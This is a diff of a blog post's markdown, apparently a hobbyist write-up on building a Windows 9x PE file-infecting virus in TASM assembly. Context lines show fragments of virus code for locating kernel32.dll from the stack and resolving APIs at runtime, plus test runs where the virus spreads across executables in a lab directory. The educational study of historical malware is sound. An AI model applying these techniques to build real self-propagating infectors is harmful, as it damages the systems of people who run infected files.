@@ -33,13 +33,13 @@ The first Win32 API function the `pijector` virus code uses is [`FindFirstFileA`
 
 In the source code it looks like:
 
-```
+```nasm
 call FindFirstFileA, eax, ebx
 ```
 
 In the disassembly view it looks like:
 
-```
+```nasm
 push ebx
 push eax
 call PIJECTOR.0040165C
@@ -53,7 +53,7 @@ Seeing a call to an unknown address the first question I have is "what code is a
 
 Now `td32` shows:
 
-```
+```nasm
 jmp [00403060]
 ```
 
@@ -63,7 +63,7 @@ So the call takes the debugger to a `jmp` instruction to the address specified a
 
 Entering `[00403060]` as the expression (just like in the disassembly) shows the `dword` hex value:
 
-```
+```nasm
 0x82C8F140
 ```
 
@@ -73,7 +73,7 @@ That looks more like what I was expecting initially: an address in `kernel32.dll
 
 Now the disassembly shows:
 
-```
+```nasm
 push BFF77A18
 jmp KERNEL32.BFF93BD3
 ```
@@ -101,7 +101,7 @@ The `push BFF77A18` instruction that `jmp [00403060]` brings execution to is int
 
 In my `kernel32.dll`'s exports the `FindFirstFileA` function appears like so:
 
-```
+```nasm
     0249    00007a18  FindFirstFileA
 ```
 
@@ -129,13 +129,13 @@ Loading the infected generation 1 `calc.exe` in `td32` I saw the `call FindFirst
 
 In generation 0 the disassembly was:
 
-```
+```nasm
 call PIJECTOR.0040165C
 ```
 
 In generation 1 the disassembly is:
 
-```
+```nasm
 call 0041365C
 ```
 
@@ -151,7 +151,7 @@ So far execution has looked the same. Moving on to following the `call` will ans
 
 The disassembly shows a `jmp` instruction and its target (`[00403060]`) looks the same as in generation 0. So far so good.
 
-```
+```nasm
 jmp [CALC.00403060]
 ```
 
@@ -161,7 +161,7 @@ Using the data inspector window again the address at `[00403060]` for the `jmp` 
 
 This time it shows a DWORD with the hex value:
 
-```
+```nasm
 0xFE830574
 ```
 
@@ -218,7 +218,7 @@ The "trick" I used instead is an old one. The first reference I saw was in [29A 
 
 The core idea is to take advantage of the fact that it's `kernel32.dll` that calls every program's entrypoint when it is first started by the operating system. More specifically it's the `kernel32.dll`'s `CreateProcess` function that calls the program's entrypoint. Since the virus code replaces the infected program's original entrypoint I know that at the start of the virus code's execution the return address on the top of the stack will be pointing back into `kernel32.dll` somewhere.
 
-```
+```nasm
 @@findkernel32:
   ; Put the dword value from the top of the stack into esi. This is the return
   ; address for the kernel32.CreateProcess function call one frame above us and
@@ -230,7 +230,7 @@ Since `kernel32.dll` is a DLL and DLLs are portable executables I know what the 
 
 Using the return address from the stack the virus code can search backwards by the size of a section, looking for the DOS header magic bytes. When it finds a section aligned address that has the expected header it will be the base address of `kernel32.dll`.
 
-```
+```nasm{numberLines:true}
   ; We know the DLL is section aligned so clear out the lower byte of ESI to
   ; begin the search at the section start.
   and esi, 0FFFF0000h
@@ -280,7 +280,7 @@ The virus code from `pijector` uses a handful of `kernel32.dll` functions (`Find
 
 To find the address of `FindFirstFileA` the `apifind.asm` code uses the discovered `GetProcAddress` address (held in a var `GetProcAddress`):
 
-```
+```nasm{numberLines:true}
   ; Put the kernel32.dll base address in ebx
   mov ebx, [kernel32Base]
   ; Put the offset of the null terminated string "FindFirstFileA\0" into ecx
@@ -307,7 +307,7 @@ One of the other challenges I encountered was finding a way to use raw function 
 
 You might notice that weird `call` syntax in the fragment above. It relies on a `procGetProcAddress` `PROCDESC`. In brief `PROCDESC` is a bit of TASM syntax that lets me give the assembler a description of the function I'm calling so it can use the correct calling convention and check the arguments. For `GetProcAddress` the `procGetProcAddress` `PROCDESC` looks like:
 
-```
+```nasm
 procGetProcAddress PROCDESC stdcall baseAddr:DWORD,name:DWORD
 ```
 
@@ -315,7 +315,7 @@ It indicates that the `stdcall` calling convention should be used and there are 
 
 The `apifind.asm` code uses a similar `PROCDESC` to invoke the `kernel32.FindFirstFileA` function by the address found with `GetProcAddress`:
 
-```
+```nasm{numberLines:true}
 procFindFirstFileA PROCDESC stdcall fileName:DWORD,findData:DWORD
 
 <snipped>
@@ -356,7 +356,7 @@ I created four macros, each addressing one of the four parts involved in the pro
 
 The macro I wrote for declaring a name variable and a pointer variable for each API is called `REQUIRED_API`:
 
-```
+```nasm{numberLines:true}
 ; REQUIRED_API is a macro that defines two vars:
 ;  1. a zero terminated API name
 ;  2. a pointer to the API function
@@ -384,7 +384,7 @@ ENDM
 
 The macro I wrote for generating a `PROCDESC` for each API is called `DESC_RUNTIME_API`:
 
-```
+```nasm{numberLines:true}
 ; DESC_RUNTIME_API is a macro that creates a PROCDESC prefixed
 ; with "proc" for a given proc name. It's described as having the
 ; given arguments and using stdcall convention.
@@ -411,7 +411,7 @@ ENDM
 
 The macro I wrote to find the `kernel32.dll` function address for a `REQUIRED_API` is called `LINK_API`:
 
-```
+```nasm{numberLines:true}
 ; LINK_API finds the given REQUIRED_API in kernel32.dll by its sz pointer
 ; using GetProcAddress. The API address is saved in the REQUIRED_API
 ; function pointer for use with CALL_RUNTIME_API. A variable called
@@ -436,7 +436,7 @@ ENDM
 
 The last macro is the one used to invoke functions previously described with `DESC_RUNTIME_API` and declared with `REQUIRED_API`. The `LINK_API` macro uses `CALL_RUNTIME_API` to call `GetProcAddress`.
 
-```
+```nasm{numberLines:true}
 ; CALL_RUNTIME_API is a macro that calls a given API previously setup
 ; with REQUIRED_API, DESC_RUNTIME_API and LINK_API. The given reg will
 ; be used as a scratch register to load the address of the API to call.
@@ -477,7 +477,7 @@ After these three pieces were in place I updated each of the existing `call <win
 
 It's finally time to see if the virus code can propagate itself beyond the first generation. To test the updated `apisafejector` virus I started by infecting `calc.exe` by using the `Makefile`'s run target with a clean build (without debug symbols):
 
-```
+```bash
 make clean
 make
 make run
@@ -524,7 +524,7 @@ Object table:
 
 Since the virus only infects `*.exe` files in the same directory it's easy to make a little test lab to see if the first generation `calc.exe` infection is working. I simply made a new directory, copied in the infected `calc.exe` and then copied in a clean `cdplayer.exe` from the Windows directory.
 
-```
+```bash
 mkdir test
 cd test
 copy ..\calc.exe
@@ -570,7 +570,7 @@ Object table:
 
 To ensure this wasn't a fluke I tried making one more test directory to see if the generation 2 infection in `cdplayer.exe` could propagate.
 
-```
+```bash
 mkdir test2
 cd test2
 copy ..\cdplayer.exe
